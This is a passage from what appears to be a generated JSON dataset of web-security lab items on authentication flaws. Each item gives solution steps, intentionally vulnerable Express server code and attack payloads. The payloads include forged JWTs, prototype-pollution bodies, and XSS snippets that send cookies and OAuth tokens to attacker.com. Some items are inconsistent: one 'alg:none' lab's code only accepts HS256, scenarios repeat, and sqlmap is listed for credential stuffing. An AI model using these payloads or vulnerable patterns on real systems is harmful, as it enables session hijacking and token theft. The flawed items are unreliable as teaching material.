    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Intercept WebRTC connection initiation",
      "Modify SDP offer to include token capture",
      "Establish data channel to attacker server",
      "Capture token from SDP metadata"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const {RTCPeerConnection}=require('wrtc');const app=express();app.get('/oauth/callback',(req,res)=>{const token='tok_'+Math.random();res.send(`<script>const pc=new RTCPeerConnection();pc.createOffer().then(o=>{o.sdp+='a=token:${token}\\r\\n';return pc.setLocalDescription(o);});</script>`);});app.listen(3000);",
    "payloads": [
      "a=token: [leaked_token]",
      "o=- 0 0 IN IP4 0.0.0.0\\r\\na=token:[leaked_token]"
    ]
  },
  {
    "Lab scenario": "Session fixation via HTTP/2 ALTSVC frames",
    "Lab Description": "The application assigns sessions based on HTTP/2 ALTSVC frame parameters without validation. The vulnerable server uses alternative service identifiers as session tokens. To solve: establish connection with malicious ALTSVC frame and trick victim into authenticating.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept HTTP/2 traffic using specialized proxy",
      "Craft ALTSVC frame with fixed service identifier",
      "Establish connection with fixed session identifier",
      "Trigger victim authentication via CSRF",
      "Hijack session using known service identifier"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const http2=require('http2');const fs=require('fs');const sessions={};const server=http2.createSecureServer({key:fs.readFileSync('key.pem'),cert:fs.readFileSync('cert.pem')});server.on('stream',(stream,headers)=>{if(stream.session.altsvc){sessions[stream.session.altsvc]={};}stream.end('Session: '+stream.session.altsvc);});server.listen(443);",
    "payloads": [
      "ALTSVC 'h2=\"attacker.com:443\"'; ma=3600; persist=1",
      "ALTSVC 'h3=\":443\"'; ma=86400"
    ]
  },
  {
    "Lab scenario": "MFA bypass via JSON prototype pollution in REST API",
    "Lab Description": "The MFA verification endpoint is vulnerable to JSON prototype pollution. The vulnerable API fails to properly sanitize nested objects. To solve: bypass MFA by polluting Object prototype with verified property.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture legitimate MFA verification POST request",
      "Modify JSON payload to include prototype pollution",
      "Resend request with polluted prototype",
      "Observe successful authentication without valid code",
      "Access privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express=require('express');const bodyParser=require('body-parser');const app=express();app.use(bodyParser.json());const sessions={};app.post('/verify-mfa',(req,res)=>{const{sessionId,code}=req.body;if(req.body.__proto__.verified||sessions[sessionId]?.code===code){sessions[sessionId].verified=true;res.json({success:true});}else{res.status(403).json({error:'Invalid code'});}});app.listen(3000);",
    "payloads": [
      "{\"sessionId\":\"victim\",\"code\":\"111111\",\"__proto__\":{\"verified\":true}}",
      "{\"sessionId\":\"victim\",\"constructor\":{\"prototype\":{\"verified\":true}}}"
    ]
  },
  {
    "Lab scenario": "JWT alg:none vulnerability in REST API authentication",
    "Lab Description": "The application uses JWT tokens with improper signature validation. The vulnerable endpoint accepts unsigned tokens when 'alg:none' is specified. To solve: Craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT token using Burp Suite",
      "Decode the token structure using jwt.io",
      "Modify the algorithm to 'none' and add admin claims",
      "Remove the signature portion completely",
      "Submit the modified token to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization.split(' ')[1];try {const decoded = jwt.verify(token, process.env.SECRET, {algorithms: ['HS256']});if(decoded.role === 'admin') res.send('Admin access granted');} catch(e) {res.status(403).send('Access denied');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via referer header in social login",
    "Lab Description": "The application's OAuth implementation leaks access tokens through referer headers when loading external resources. To solve: Capture the leaked token and use it to authenticate as another user.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze OAuth flow using OWASP ZAP",
      "Identify token leakage in referer headers",
      "Create malicious page that triggers resource loading",
      "Capture token when victim visits your page",
      "Use token to authenticate via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = req.query.access_token;res.send(`<script src='https://external.com/analytics.js'></script>`);});app.get('/profile', (req, res) => {if(req.headers.authorization === `Bearer ${token}`) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<img src='http://attacker.com/collect?leak='>",
      "<link rel='stylesheet' href='http://attacker.com/steal.css'>"
    ]
  },
  {
    "Lab scenario": "Session fixation via login CSRF in GraphQL endpoint",
    "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. To solve: Fixate a session token and force a victim to authenticate with it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture session token assignment using Burp",
      "Construct CSRF payload with fixed session",
      "Trigger authentication via GraphQL mutation",
      "Use the fixated session to access account",
      "Extract sensitive data via GraphQL queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,context: ({req}) => {if(!req.session.userId) req.session.userId = uuidv4();return {session: req.session};}}));const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "mutation {login(username:\"victim\",password:\"password\"){token}}",
      "<form action=\"https://target.com/graphql\" method=\"POST\"><input type=\"hidden\" name=\"query\" value=\"mutation{login(username:'victim',password:'password'){token}}\"/>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status parameter manipulation",
    "Lab Description": "The application checks MFA status via client-side parameter that can be manipulated. To solve: Bypass MFA by modifying the status parameter after partial authentication.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification request with Burp",
      "Identify status parameter in JSON response",
      "Modify status from 'pending' to 'verified'",
      "Replay the modified request",
      "Access restricted functionality"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.post('/mfa/verify', (req, res) => {const {code, status} = req.body;if(status === 'verified') res.json({access: true});else if(code === '123456') res.json({status: 'verified'});else res.json({status: 'pending'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"status\":\"verified\"}",
      "{\"code\":\"123456\",\"status\":\"verified\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via insecure API rate limiting",
    "Lab Description": "The login API has inconsistent rate limiting allowing credential stuffing attacks. To solve: Bypass rate limits using header manipulation and common credentials.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify rate limit headers using OWASP ZAP",
      "Bypass limits via X-Forwarded-For spoofing",
      "Load credential list into sqlmap",
      "Configure sqlmap to use header bypass",
      "Extract valid credentials from responses"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const rateLimit = require('express-rate-limit');const app = express();const limiter = rateLimit({windowMs: 15*60*1000,max: 5});app.post('/api/login', limiter, (req, res) => {const {user, pass} = req.body;if(db.checkCredentials(user, pass)) res.json({token: 'valid'});else res.status(401).json({error: 'Invalid'});});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "X-Forwarded-For: 127.0.0.1",
      "X-Forwarded-For: 192.168.1.1, 10.0.0.1"
    ]
  },
  {
    "Lab scenario": "Session hijacking via subdomain cookie scope",
    "Lab Description": "The application sets session cookies to parent domain allowing subdomain takeover. To solve: Exploit overly permissive cookie scope to hijack sessions across subdomains.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Map all subdomains using Sublist3r",
      "Identify vulnerable subdomain with XSS",
      "Inject cookie-stealing payload",
      "Capture parent domain cookies",
      "Reuse cookies on main application"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/login', (req, res) => {res.cookie('session', 'value', {domain: '.example.com'});res.send('Logged in');});app.get('/admin', (req, res) => {if(req.cookies.session === 'value') res.send('Admin');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script>document.write('<img src=\"http://attacker.com/?c='+document.cookie+'\">');</script>",
      "<iframe src=\"javascript:document.location='http://attacker.com/?c='+document.cookie\"></iframe>"
    ]
  },
  {
    "Lab scenario": "JWT kid header injection in microservice authentication",
    "Lab Description": "The application's JWT validation improperly handles the kid header parameter, allowing arbitrary file path injection. The vulnerable service [trusts kid header without sanitization]. To solve: Forge a valid admin token by exploiting the kid parameter to load a predictable secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT token using Burp Suite and decode structure",
      "Identify kid header pointing to /dev/null in development environment",
      "Modify kid to point to /proc/self/environ or /etc/passwd",
      "Craft new token using extracted environment variables",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();app.get('/admin', (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.verify(token, (header, callback) => {fs.readFile(header.kid, (err, key) => {callback(null, key);});} catch(e) {res.status(403).send('Invalid token');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9ldGMvcGFzc3dkIn0.eyJ1c2VyIjoiYWRtaW4ifQ.8R-K3x4x9LUPchJkZ-wX-7GmZ2q6y1Y1h6Z7J8l9J0k",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1A2b3C4d5E6f7G8h9I0j1K2l3M4n5O6p7Q8r9S0t1U"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via state parameter tampering",
    "Lab Description": "The OAuth implementation fails to validate state parameters properly during token exchange. The application [maintains session state through unprotected cookies]. To solve: Hijack another user's OAuth flow by intercepting and modifying state parameters.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow and capture initial request with OWASP ZAP",
      "Note state parameter and session cookie values",
      "Create malicious link with victim's session cookie but your state",
      "Trigger victim to click while intercepting token callback",
      "Swap state parameter to capture victim's access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const {state, code} = req.query;const token = exchangeCodeForToken(code);if(req.cookies.session === state) res.send(token);});app.get('/profile', (req, res) => {if(req.headers.authorization) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://oauth-provider.com/auth?client_id=123&state=ATTACKER_SESSION&redirect_uri=https://victim.com/callback",
      "https://victim.com/oauth/callback?code=XYZ123&state=VICTIM_SESSION"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket connection",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses WS connections for multiple operations]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your WS ID",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via race condition in verification API",
    "Lab Description": "The MFA verification endpoint suffers from a race condition when handling concurrent requests. The application [uses non-atomic operations for verification status]. To solve: Send parallel requests to bypass MFA by exploiting timing window between verification and status update.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept MFA verification request with Burp Suite",
      "Send legitimate verification code in first request",
      "Immediately send second request with invalid code",
      "Repeat with Turbo Intruder to exploit timing window",
      "Access authenticated session before status is updated"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();let verified = false;app.post('/mfa/verify', (req, res) => {if(req.body.code === '123456') {setTimeout(() => {verified = true;}, 1000);res.send('Verifying...');} else {verified = false;res.send('Invalid code');}});app.get('/dashboard', (req, res) => {if(verified) res.send('Admin dashboard');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"123456\"}",
      "POST /mfa/verify HTTP/1.1\r\nHost: victim.com\r\nContent-Length: 15\r\n\r\n{\"code\":\"111111\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via JSONP authentication endpoint",
    "Lab Description": "The legacy JSONP authentication endpoint lacks rate limiting and proper CORS headers. The application [exposes user enumeration through subtle response differences]. To solve: Perform credential stuffing attack via JSONP callbacks to bypass same-origin policy.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify JSONP authentication endpoint using OWASP ZAP",
      "Craft malicious HTML page with credential payloads",
      "Analyze callback responses for successful authentications",
      "Automate attack with custom script cycling through credentials",
      "Hijack valid session from successful callback"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/auth/jsonp', (req, res) => {const {user, pass, callback} = req.query;const valid = db.checkCredentials(user, pass);res.send(`${callback}(${JSON.stringify({valid})})`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<script src=\"https://victim.com/auth/jsonp?user=admin&pass=password&callback=steal\"></script>",
      "<script>function steal(data){if(data.valid) document.location='http://attacker.com/?creds=valid';}</script>"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation improperly trusts the jku header to fetch verification keys from external sources. The application [fails to validate jku domains]. To solve: Forge admin token by hosting malicious JWKS file and injecting your jku header.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Set up attacker-controlled server hosting crafted JWKS file",
      "Modify jku header to point to malicious JWKS endpoint",
      "Sign new token with attacker's private key",
      "Submit forged token to admin API endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const axios = require('axios');const app = express();app.get('/admin', async (req, res) => {const token = req.headers.authorization;try {const decoded = jwt.decode(token, {complete: true});const jwks = await axios.get(decoded.header.jku);const key = jwks.data.keys[0];jwt.verify(token, key);res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MifQ.eyJ1c2VyIjoiYWRtaW4ifQ.EPV9...",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vbWFsY2RuLmNvbS9tYWxpY2lvdXMuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.KJB2..."
    ]
  },
  {
    "Lab scenario": "Session fixation via XSS in OAuth redirect_uri parameter",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values and reflects session tokens in URL fragments. The application [stores session tokens client-side]. To solve: Chain XSS in redirect_uri with session fixation to hijack user sessions.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Craft malicious redirect_uri with XSS payload",
      "Trigger victim to initiate OAuth flow",
      "Capture session token from reflected fragment",
      "Fixate session using stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/auth', (req, res) => {const {redirect_uri} = req.query;const token = generateToken();res.redirect(`${redirect_uri}#token=${token}`);});app.get('/profile', (req, res) => {const token = req.query.token || req.cookies.session;if(validateToken(token)) res.send(userData);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://attacker.com/xss.html%23",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "MFA bypass via HTTP method tampering on verification endpoint",
    "Lab Description": "The MFA verification endpoint fails to enforce proper HTTP method validation. The application [processes GET and POST identically]. To solve: Bypass MFA by converting POST verification to GET request with parameters in query string.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept MFA verification POST request with Burp Suite",
      "Change method from POST to GET",
      "Move parameters from body to query string",
      "Resend request without valid MFA code",
      "Observe successful authentication bypass"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.use(express.json());app.all('/mfa/verify', (req, res) => {const code = req.body.code || req.query.code;if(code === '123456') res.send('Verified');else res.status(403).send('Invalid');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "GET /mfa/verify?code=123456 HTTP/1.1",
      "GET /mfa/verify?code= HTTP/1.1"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-sensitive password comparison",
    "Lab Description": "The authentication endpoint performs case-sensitive password comparison against lowercase stored values. The application [stores passwords in lowercase]. To solve: Perform credential stuffing attack using lowercase variants of known password leaks.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known credential lists into Burp Intruder",
      "Configure payload processing to lowercase all passwords",
      "Execute attack with processed payloads",
      "Identify successful authentications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'secret123'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user);if(account && account.pass === pass.toLowerCase()) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"admin\",\"pass\":\"SECRET123\"}",
      "{\"user\":\"admin\",\"pass\":\"SeCrEt123\"}"
    ]
  },
  {
    "Lab scenario": "Session hijacking via GraphQL batch query IDOR",
    "Lab Description": "The GraphQL endpoint processes batch queries with shared authentication context. The application [reuses session for all queries in batch]. To solve: Inject unauthorized queries alongside legitimate ones in batch request to access other users' data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify GraphQL batch endpoint using Postman",
      "Capture legitimate authenticated query",
      "Construct batch request mixing authorized and unauthorized queries",
      "Embed session hijacking query targeting admin data",
      "Extract sensitive data from batch response"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const {graphqlHTTP} = require('express-graphql');const app = express();app.use('/graphql', graphqlHTTP({schema: schema,batch: true}));app.listen(3000);",
    "payloads": [
      "[{\"query\":\"query { myProfile { email }}\"},{\"query\":\"query { user(id:1) { privateData }}\"}]",
      "[{\"query\":\"mutation { changePassword(new:\\\"hacked\\\")}\"},{\"query\":\"query { allUsers { apiKeys }}\"}]"
    ]
  },
  {
    "Lab scenario": "JWT brute-force via weak HS256 secret in debug endpoint",
    "Lab Description": "The debug endpoint leaks JWT verification secrets through verbose error messages. The application [exposes secret in HMAC-SHA256 validation failures]. To solve: Extract weak secret from error response and forge admin token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send malformed JWT to debug endpoint using Burp Suite",
      "Extract secret key from verbose error message",
      "Use cracked secret to sign new admin token",
      "Bypast rate limiting by varying JWT claims",
      "Access admin dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/debug', (req, res) => {try {jwt.verify(req.body.token, 'secret123', {algorithms:['HS256']});res.send('Valid');} catch(e) {res.send(`Error: ${e.message} using secret secret123`);}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"token\":\"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciJ9.InvalidToken\"}",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.7J2Q..."
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via asymmetric to symmetric substitution",
    "Lab Description": "The JWT implementation accepts both asymmetric and symmetric algorithms but fails to validate the signing method consistently. The application [treats RS256 as HS256 when key is embedded]. To solve: Convert public key to symmetric secret and forge valid tokens.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Extract public key from application's /.well-known/jwks.json endpoint",
      "Convert RSA public key to PEM format using Burp Suite",
      "Modify JWT header to use HS256 algorithm instead of RS256",
      "Sign new token using public key as symmetric secret",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const fs = require('fs');const app = express();const publicKey = fs.readFileSync('./public.pem');app.post('/verify', (req, res) => {try {jwt.verify(req.body.token, publicKey, {algorithms: ['RS256','HS256']});res.send('Valid');} catch(e) {res.status(403).send('Invalid');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via iframe CSP bypass",
    "Lab Description": "The OAuth token endpoint is embedded in iframes with overly permissive CSP headers. The application [leaks tokens through postMessage events]. To solve: Craft malicious page that extracts tokens via iframe CSP bypass.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth iframe endpoints using OWASP ZAP",
      "Analyze CSP headers for unsafe-eval or unsafe-inline directives",
      "Create malicious page embedding target iframe",
      "Inject JavaScript to intercept postMessage events",
      "Extract OAuth tokens from message data"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/iframe', (req, res) => {res.set('Content-Security-Policy', \"default-src 'self' 'unsafe-inline'\");res.send(`<script>parent.postMessage({token:'secret123'},'*')</script>`);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "<iframe src=\"https://victim.com/oauth/iframe\" onload=\"window.addEventListener('message',e=>document.location='http://attacker.com/?token='+e.data.token)\"></iframe>",
      "<script>var iframe=document.createElement('iframe');iframe.src='https://victim.com/oauth/iframe';document.body.appendChild(iframe);window.addEventListener('message',e=>fetch('http://attacker.com',{method:'POST',body:e.data.token}));</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via WebSocket handshake parameter injection",
    "Lab Description": "The WebSocket connection assigns session tokens based on unvalidated handshake parameters. The application [trusts ws:// URL parameters for session binding]. To solve: Inject session token through crafted WebSocket URL and force victim to authenticate.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket connection using Burp Suite",
      "Modify handshake request to include session parameter",
      "Create malicious page initiating WebSocket connection",
      "Trigger victim to authenticate during active WebSocket session",
      "Take over authenticated session using fixated token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const WebSocket = require('ws');const app = express();const wss = new WebSocket.Server({server: app.listen(3000)});wss.on('connection', (ws, req) => {const session = new URL(req.url,'ws://localhost').searchParams.get('session');ws.session = session || uuidv4();});",
    "payloads": [
      "ws://victim.com/chat?session=malicious123",
      "new WebSocket('ws://victim.com/chat?session=fixed_session_id')"
    ]
  },
  {
    "Lab scenario": "MFA bypass via time-based one-time password prediction",
    "Lab Description": "The TOTP implementation uses insufficient entropy in seed generation. The application [generates predictable MFA seeds based on username]. To solve: Calculate valid TOTP codes by reverse-engineering the seed generation algorithm.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enroll multiple test accounts and collect their TOTP seeds",
      "Analyze seed patterns using Python scripts",
      "Reverse-engineer seed generation formula",
      "Calculate victim's likely seed based on username",
      "Generate valid TOTP codes using predicted seed"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const speakeasy = require('speakeasy');const app = express();app.post('/mfa/enroll', (req, res) => {const seed = Buffer.from(req.body.username).toString('hex').slice(0,10);const otp = speakeasy.generateSecret({seed});res.json(otp);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"username\":\"carlos\",\"code\":\"123456\"}",
      "{\"username\":\"admin\",\"code\":\"654321\"}"
    ]
  },
  {
    "Lab scenario": "Credential stuffing via case-insensitive username matching",
    "Lab Description": "The authentication endpoint performs case-insensitive username comparison but case-sensitive password checks. The application [stores usernames in lowercase but preserves case in passwords]. To solve: Perform credential stuffing with case-varied usernames against known password lists.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Identify authentication endpoint using OWASP ZAP",
      "Load known username lists into Burp Intruder",
      "Configure payload processing to lowercase usernames",
      "Execute attack with case-varied username payloads",
      "Identify successful authentications through response differences"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();const users = [{user:'admin',pass:'Secret123!'}];app.post('/login', (req, res) => {const {user, pass} = req.body;const account = users.find(u => u.user === user.toLowerCase());if(account && account.pass === pass) res.send('Logged in');else res.status(401).send('Failed');});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "{\"user\":\"Admin\",\"pass\":\"Secret123!\"}",
      "{\"user\":\"ADMIN\",\"pass\":\"Secret123!\"}"
    ]
  },
  {
    "Lab scenario": "JWT key injection via jwk header parameter",
    "Lab Description": "The JWT validation improperly processes embedded jwk headers in tokens. The application [trusts self-signed keys without verification]. To solve: Inject malicious RSA public key in jwk header and sign token with corresponding private key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and decode structure",
      "Generate new RSA key pair using OpenSSL",
      "Craft jwk header with attacker's public key",
      "Sign new token with attacker's private key",
      "Submit forged token to privileged endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const jwt = require('jsonwebtoken');const app = express();app.post('/admin', (req, res) => {try {const decoded = jwt.verify(req.body.token, (header, payload, done) => {const key = header.jwk ? jwkToPem(header.jwk) : publicKey;done(null, key);});res.send('Admin access');} catch(e) {res.status(403).send('Forbidden');}});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhBZGluIiwiZSI6IkFRQUIifX0.eyJ1c2VyIjoiYWRtaW4ifQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMHhNYWxpY2lvdXMiLCJlIjoiQVFBQiJ9fQ.eyJyb2xlIjoiYWRtaW4ifQ.7Z6Jz5Q4hX9y8Uv2w3T1x0R7v6N9m8B7v6N9m8B7v6N9m8B"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking via open redirect",
    "Lab Description": "The OAuth implementation allows arbitrary redirect_uri values through an open redirect vulnerability. The application [leaks tokens in URL fragments]. To solve: Chain open redirect with token leakage to steal authentication tokens.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Identify OAuth flow using OWASP ZAP",
      "Find open redirect endpoint in application",
      "Craft malicious redirect_uri pointing to open redirect",
      "Trigger authentication flow and capture token",
      "Use stolen token to access victim's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');const app = express();app.get('/oauth/callback', (req, res) => {const token = generateToken();res.redirect(`${req.query.redirect_uri}#token=${token}`);});app.get('/redirect', (req, res) => {res.redirect(req.query.url);});const PORT = 3000;app.listen(PORT);",
    "payloads": [
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=https://attacker.com",
      "https://victim.com/oauth/auth?client_id=123&redirect_uri=https://victim.com/redirect?url=data:text/html,<script>document.location='http://attacker.com/?token='+document.location.hash.substring(7)</script>"
    ]
  },
  {
    "Lab scenario": "Session fixation via GraphQL websocket subscriptions",
    "Lab Description": "The GraphQL subscription endpoint assigns session tokens over websockets before authentication. The application [reuses connection IDs as session tokens]. To solve: Establish websocket connection, fixate session ID, and force victim to authenticate over same connection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Establish GraphQL websocket connection using Postman",
      "Note connection ID in initial handshake response",
      "Create malicious page that forces victim to authenticate over your connection",
      "Monitor subscription channel for victim's data",
      "Use captured session token in regular HTTP requests"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const {createServer} = require('http');const {SubscriptionServer} = require('subscriptions-transport-ws');const server = createServer();SubscriptionServer.create({onConnect: (connParams, socket) => {socket.id = uuidv4();}}, {server, path: '/graphql'});server.listen(3000);",
    "payloads": [
      "{\"type\":\"connection_init\",\"payload\":{\"sessionId\":\"FIXATED_ID\"}}",
      "{\"query\":\"subscription {userAuth {token}}\",\"variables\":{}}"
    ]
  },
  {
    "Lab scenario": "MFA bypass via status code manipulation",
    "Lab Description": "The MFA verification endpoint relies on client-side status code interpretation. The application [processes failed verifications as successes]. To solve: Intercept and modify status code from 403 to 200 to bypass MFA.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
